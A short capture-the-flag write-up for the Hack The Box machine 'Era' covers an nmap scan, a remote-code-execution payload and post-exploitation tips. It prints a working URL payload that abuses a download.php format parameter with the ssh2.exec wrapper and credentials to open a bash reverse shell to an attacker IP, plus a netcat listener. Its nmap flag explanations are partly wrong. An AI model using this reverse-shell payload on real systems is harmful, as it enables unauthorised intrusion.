# Era - HTB Machine Writeup

## 📌 Enumeration

### Nmap Scan
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ nmap -sVCT -Pn --min-rate 5000 -p- 10.10.11.79
```
- `-sV` → Service/version detection  
- `-C` → Enable script scanning using default scripts  
- `-T` → Set timing template (adjusted for speed)  
- `-Pn` → Treat all hosts as online (skip host discovery)  
- `--min-rate 5000` → Ensure a minimum rate of packets per second  
- `-p-` → Scan all 65535 ports  

---

## 📌 Exploitation

### 1. Download.php RCE Payload
```bash
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.X.X/4444%200>%261';
```
- Replace `10.10.X.X` with your attacker IP
- Start your netcat listener before executing the payload:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ nc -lvnp 4444
```
- Once you have a shell, grab the user flag:
```bash
cat user.txt
```

---

## 📌 Privilege Escalation

(To be filled in after enumeration of local services, SUID binaries, or cron jobs.)

---

## 📌 Post-Exploitation Notes

- Always upgrade to a fully interactive TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

- Consider persistence and data exfiltration if allowed by CTF rules.

---

## 📌 Lessons Learned

- Unfiltered `format` parameter allowed arbitrary protocol execution (`ssh2.exec`).
- Proper input validation could prevent such RCE vulnerabilities.
